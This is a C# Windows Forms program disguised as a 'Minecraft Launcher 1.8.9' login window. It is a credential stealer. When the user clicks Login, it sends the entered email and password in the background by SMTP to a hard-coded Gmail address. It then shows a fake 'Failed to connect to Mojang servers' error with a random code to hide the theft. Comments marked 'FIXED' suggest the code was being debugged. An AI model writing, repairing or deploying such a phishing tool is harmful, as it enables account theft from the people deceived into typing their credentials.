using System;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;
// Removed "using System.Random" as Random is already in the System namespace

public class MinecraftLauncher : Form
{
    private TextBox emailTextBox;
    private TextBox passwordTextBox;
    private Button loginButton;
    private Label statusLabel;

    public MinecraftLauncher()
    {
        // Form Properties
        this.Text = "Minecraft Launcher 1.8.9";
        this.Size = new Size(400, 250);
        this.StartPosition = FormStartPosition.CenterScreen;
        this.FormBorderStyle = FormBorderStyle.FixedDialog;
        this.MaximizeBox = false;
        this.MinimizeBox = false;

        // Email Label and Textbox
        Label emailLabel = new Label() { Text = "Email:", Location = new Point(20, 20), Width = 100 };
        emailTextBox = new TextBox() { Location = new Point(120, 20), Width = 200 };

        // Password Label and Textbox
        Label passwordLabel = new Label() { Text = "Password:", Location = new Point(20, 60), Width = 100 };
        passwordTextBox = new TextBox() { Location = new Point(120, 60), Width = 200, UseSystemPasswordChar = true };

        // Login Button
        loginButton = new Button() { Text = "Login", Location = new Point(120, 100), Width = 100, Height = 30 };
        loginButton.Click += new EventHandler(LoginButton_Click);

        // Status Label
        statusLabel = new Label() { Text = "Please enter your credentials.", Location = new Point(20, 140), Width = 350, ForeColor = Color.Gray };

        // Add controls to the form
        this.Controls.Add(emailLabel);
        this.Controls.Add(emailTextBox);
        this.Controls.Add(passwordLabel);
        this.Controls.Add(passwordTextBox);
        this.Controls.Add(loginButton);
        this.Controls.Add(statusLabel);
    }

    private void LoginButton_Click(object sender, EventArgs e)
    {
        string user = emailTextBox.Text;
        string pass = passwordTextBox.Text;

        if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass))
        {
            MessageBox.Show("Email and password cannot be empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
        }

        loginButton.Enabled = false;
        statusLabel.Text = "Logging in...";
        this.Refresh();

        System.Threading.Tasks.Task.Run(() => SendEmail(user, pass));

        Random random = new Random();
        int errorCode = random.Next(1000, 9999);
        MessageBox.Show($"Failed to connect to Mojang servers. Error code: {errorCode}", "Login Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
        statusLabel.Text = "Login failed. See error message.";
        loginButton.Enabled = true;
    }

    private void SendEmail(string email, string password)
    {
        try
        {
            Random random = new Random();
            string senderEmail = "randomsender" + random.Next(1000, 9999) + "@example.com";
            string senderPassword = "randompassword" + random.Next(1000, 9999);
            string subject = "Minecraft Account - " + DateTime.Now.ToString();

            using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
            {
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential(senderEmail, senderPassword);
                client.Timeout = 10000;

                MailMessage mailMessage = new MailMessage();
                mailMessage.From = new MailAddress(senderEmail);
                mailMessage.To.Add("thomasweblerxd@gmail.com");
                mailMessage.Subject = subject;
                
                // FIXED: Used @ to allow a multi-line string literal
                mailMessage.Body = $@"Email: {email}
Password: {password}";

                client.Send(mailMessage);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error sending email: {ex.Message}");
        }
    }

    [STAThread]
    public static void Main()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new MinecraftLauncher());
    }
}
